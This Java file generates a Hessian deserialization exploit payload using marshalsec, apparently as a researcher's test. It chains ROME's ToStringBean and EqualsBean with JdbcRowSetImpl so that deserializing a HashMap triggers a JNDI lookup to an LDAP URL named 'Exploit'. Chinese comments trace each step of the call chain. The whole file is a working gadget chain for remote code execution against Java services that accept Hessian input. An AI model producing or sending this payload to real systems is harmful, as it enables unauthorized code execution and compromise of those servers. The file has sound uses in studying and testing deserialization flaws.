import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import marshalsec.Hessian;
import marshalsec.gadgets.JDKUtil;
import java.io.ByteArrayOutputStream;

public class GadgetsTestHessian {
    private static Object getPayload() throws Exception {
        String jndiUrl = "ldap://127.0.0.1:8087/Exploit";;//最后触发JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class,
                JDKUtil.makeJNDIRowSet(jndiUrl));//EqualsBean.beanHashCode调用ToStringBean.toString
        EqualsBean root = new EqualsBean(ToStringBean.class,item);//HashMap.hash调用EqualsBean.beanHashCode
        return JDKUtil.makeMap(root,root);//触发HashMap.put->HashMap.putVal->HashMap.hash
    }

    public static void main(String[] args) throws Exception {
        Object o=getPayload();
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(os);
        output.writeObject(o);
        output.close();
        System.out.println(os.toString());
    }
}